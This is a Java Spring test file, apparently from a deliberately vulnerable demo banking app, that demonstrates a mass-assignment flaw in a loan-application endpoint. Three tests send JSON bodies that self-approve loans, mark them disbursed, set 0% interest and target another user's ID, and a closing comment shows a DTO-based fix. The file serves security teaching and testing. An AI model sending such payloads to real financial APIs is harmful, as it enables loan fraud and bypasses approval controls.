package com.securebank.exploit;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.web.servlet.MockMvc;

import java.math.BigDecimal;
import java.util.HashMap;
import java.util.Map;

import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;

/**
 * EXPLOIT TEST: Mass Assignment (CWE-915)
 * Location: LoanController.applyForLoan()
 *
 * This test demonstrates that users can manipulate restricted fields
 * by including them in the JSON request body. The Loan entity is directly
 * bound from the request, allowing attackers to set status=APPROVED and approvedBy.
 */
@SpringBootTest
@AutoConfigureMockMvc
public class MassAssignmentExploitTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private ObjectMapper objectMapper;

    /**
     * TEST 1: Self-Approve Loan Application
     * Attacker sets status to APPROVED in the request
     */
    @Test
    @WithMockUser(username = "attacker", roles = "USER")
    public void testMassAssignment_SelfApproveLoan() throws Exception {
        // EXPLOIT: Include "status": "APPROVED" in the loan application
        Map<String, Object> maliciousLoanRequest = new HashMap<>();
        maliciousLoanRequest.put("amount", new BigDecimal("100000.00"));
        maliciousLoanRequest.put("interestRate", new BigDecimal("0.01")); // 0.01% interest!
        maliciousLoanRequest.put("termMonths", 360);
        maliciousLoanRequest.put("status", "APPROVED"); // MALICIOUS: Self-approve
        maliciousLoanRequest.put("approvedBy", 999L); // MALICIOUS: Fake approver

        String requestBody = objectMapper.writeValueAsString(maliciousLoanRequest);

        mockMvc.perform(post("/api/loans/apply")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(requestBody))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("APPROVED")) // SUCCESS: Loan is pre-approved!
                .andExpect(jsonPath("$.approvedBy").value(999)) // SUCCESS: Fake approver set!
                .andDo(result -> {
                    System.out.println("EXPLOIT SUCCESS: Loan auto-approved!");
                    System.out.println("Response: " + result.getResponse().getContentAsString());
                });

        // IMPACT: Attacker bypassed the entire loan approval workflow!
    }

    /**
     * TEST 2: Set Favorable Terms
     * Manipulate interest rate and other terms
     */
    @Test
    @WithMockUser(username = "attacker", roles = "USER")
    public void testMassAssignment_ManipulateTerms() throws Exception {
        // EXPLOIT: Set extremely favorable terms
        Map<String, Object> maliciousLoanRequest = new HashMap<>();
        maliciousLoanRequest.put("amount", new BigDecimal("1000000.00")); // $1 million
        maliciousLoanRequest.put("interestRate", new BigDecimal("0.0")); // 0% interest!
        maliciousLoanRequest.put("termMonths", 600); // 50 years
        maliciousLoanRequest.put("status", "DISBURSED"); // Already disbursed!
        maliciousLoanRequest.put("approvedBy", 1L);
        maliciousLoanRequest.put("userId", 666L); // Try to create loan for different user

        String requestBody = objectMapper.writeValueAsString(maliciousLoanRequest);

        mockMvc.perform(post("/api/loans/apply")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(requestBody))
                .andExpect(status().isOk())
                .andDo(result -> {
                    System.out.println("Response: " + result.getResponse().getContentAsString());
                    // Check if status was successfully set
                });
    }

    /**
     * TEST 3: Bypass Approval Workflow
     * Set status to DISBURSED to skip approval entirely
     */
    @Test
    @WithMockUser(username = "attacker", roles = "USER")
    public void testMassAssignment_BypassApprovalWorkflow() throws Exception {
        // EXPLOIT: Set status directly to DISBURSED
        Map<String, Object> maliciousLoanRequest = new HashMap<>();
        maliciousLoanRequest.put("amount", new BigDecimal("50000.00"));
        maliciousLoanRequest.put("interestRate", new BigDecimal("0.01"));
        maliciousLoanRequest.put("termMonths", 120);
        maliciousLoanRequest.put("status", "DISBURSED"); // Skip straight to disbursed!
        maliciousLoanRequest.put("approvedBy", 1L);

        String requestBody = objectMapper.writeValueAsString(maliciousLoanRequest);

        mockMvc.perform(post("/api/loans/apply")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(requestBody))
                .andExpect(status().isOk())
                .andDo(result -> {
                    System.out.println("Loan Status: " +
                            objectMapper.readTree(result.getResponse().getContentAsString())
                                    .get("status").asText());
                });

        // SUCCESS: Loan is marked as disbursed without any approval!
    }

    /**
     * SECURITY IMPACT:
     * - Complete bypass of business logic
     * - Users can self-approve loans without manager review
     * - Can set arbitrary interest rates (including 0%)
     * - Can set extremely long loan terms
     * - Financial loss for the institution
     * - Fraud and compliance violations
     * - Audit trail shows fake approvers
     *
     * FIX: Use DTOs instead of entities:
     * @PostMapping("/apply")
     * public Loan apply(@RequestBody LoanApplicationDTO dto) {
     *     Loan loan = new Loan();
     *     loan.setAmount(dto.getAmount());
     *     loan.setInterestRate(dto.getInterestRate());
     *     loan.setTermMonths(dto.getTermMonths());
     *     loan.setStatus(LoanStatus.PENDING); // Force PENDING
     *     loan.setUserId(getCurrentUserId());
     *     // Don't allow setting approvedBy or status from request
     *     return loanRepository.save(loan);
     * }
     */
}
